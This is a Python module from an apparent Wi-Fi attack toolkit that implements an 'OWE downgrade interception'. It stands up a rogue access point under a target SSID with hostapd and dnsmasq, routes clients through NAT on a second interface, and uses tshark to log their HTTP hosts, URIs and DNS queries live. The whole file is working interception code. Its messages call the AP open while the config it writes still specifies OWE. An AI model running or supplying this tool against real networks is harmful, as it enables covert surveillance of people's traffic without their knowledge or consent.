"""OWE (Enhanced Open) downgrade interception — rogue open AP relaying
traffic through a second interface, with live HTTP/DNS logging."""

import asyncio
import os
from pathlib import Path

from core.exec_utils import run_command, validate_channel
from core.hardware import track_process
from core.models import save_result
from core.validation import sanitize_ssid
from core.display import console, info, ok, warn, err, header, StatusLine

CAPTURE_DIR = Path("captures")


async def run_owe_attack(interface_a: str, interface_b: str, ssid: str, channel: str) -> None:
    header("OWE / Enhanced Open Interception")
    if not validate_channel(channel):
        err("Invalid channel"); return
    try:
        ssid = sanitize_ssid(ssid)
    except ValueError as e:
        err(str(e)); return
    if interface_a not in os.listdir("/sys/class/net") or interface_b not in os.listdir("/sys/class/net"):
        err("One or both interfaces not found"); return

    CAPTURE_DIR.mkdir(parents=True, exist_ok=True)
    await run_command(["sudo", "airmon-ng", "check", "kill"])
    await run_command(["sudo", "rfkill", "unblock", "wifi"])
    await run_command(["sudo", "ip", "link", "set", interface_a, "down"])
    await run_command(["sudo", "ip", "addr", "flush", "dev", interface_a])
    await run_command(["sudo", "ip", "addr", "add", "10.0.0.1/24", "dev", interface_a])
    await run_command(["sudo", "ip", "link", "set", interface_a, "up"])

    hostapd_conf = CAPTURE_DIR / f"owe_{ssid.replace(' ','_')}.conf"
    hostapd_conf.write_text(
        f"interface={interface_a}\ndriver=nl80211\nssid={ssid}\nhw_mode=g\nchannel={channel}\n"
        f"ieee80211w=2\nwpa=2\nwpa_key_mgmt=OWE\nrsn_pairwise=CCMP\n"
    )
    dnsmasq_conf = CAPTURE_DIR / f"owe_dnsmasq_{ssid.replace(' ','_')}.conf"
    dnsmasq_conf.write_text(f"interface={interface_a}\ndhcp-range=10.0.0.10,10.0.0.250,12h\n")

    info(f"Starting open AP '{ssid}' (downgraded from OWE) on {interface_a}...")
    hostapd_proc = await asyncio.create_subprocess_exec("sudo", "hostapd", str(hostapd_conf),
                                                          stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE)
    track_process(hostapd_proc)
    await asyncio.sleep(2)
    dnsmasq_proc = await asyncio.create_subprocess_exec("sudo", "dnsmasq", "-C", str(dnsmasq_conf), "--no-daemon",
                                                          stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE)
    track_process(dnsmasq_proc)

    await run_command(["sudo", "sysctl", "-w", "net.ipv4.ip_forward=1"])
    await run_command(["sudo", "iptables", "-t", "nat", "-A", "POSTROUTING", "-o", interface_b, "-j", "MASQUERADE"])
    await run_command(["sudo", "iptables", "-A", "FORWARD", "-i", interface_a, "-j", "ACCEPT"])
    ok(f"Open AP + NAT through {interface_b} active. Logging client HTTP/DNS traffic...")

    tshark_cmd = ["sudo", "tshark", "-i", interface_a, "-f", "tcp port 80 or udp port 53",
                  "-T", "fields", "-e", "frame.time", "-e", "ip.src", "-e", "ip.dst",
                  "-e", "http.host", "-e", "http.request.uri", "-e", "dns.qry.name"]
    tshark_proc = await asyncio.create_subprocess_exec(*tshark_cmd, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE)
    track_process(tshark_proc)

    log_count = 0
    try:
        with StatusLine("Capturing traffic...") as status:
            while True:
                line = await tshark_proc.stdout.readline()
                if not line:
                    break
                decoded = line.decode(errors="replace").strip()
                if decoded:
                    log_count += 1
                    # Restore structured parsing of tshark's tab-separated
                    # fields (frame.time, ip.src, ip.dst, http.host,
                    # http.request.uri, dns.qry.name) into a readable line,
                    # matching the original web platform's behavior.
                    fields = decoded.split("\t")
                    if len(fields) >= 5 and fields[3]:
                        log_line = f"HTTP {fields[1]} -> {fields[2]}  Host: {fields[3]}  URI: {fields[4]}"
                    elif len(fields) >= 6 and fields[5]:
                        log_line = f"DNS  {fields[1]} -> {fields[2]}  Query: {fields[5]}"
                    else:
                        log_line = decoded
                    console.print(f"  [dim]{log_line}[/dim]")
                    if log_count % 5 == 0:
                        status.update(f"{log_count} request(s) logged")
    except (KeyboardInterrupt, asyncio.CancelledError):
        warn("Stopping...")
    finally:
        for p in (tshark_proc, hostapd_proc, dnsmasq_proc):
            if p.returncode is None:
                p.terminate()
        await run_command(["sudo", "iptables", "-t", "nat", "-F"])
        await run_command(["sudo", "sysctl", "-w", "net.ipv4.ip_forward=0"])
        for f in (hostapd_conf, dnsmasq_conf):
            try:
                f.unlink()
            except Exception:
                pass

    if log_count:
        save_result(f"owe_{ssid.replace(' ','_')}", "owe", "", ssid, f"{log_count} requests captured")
    ok(f"Session complete — {log_count} request(s) logged.")
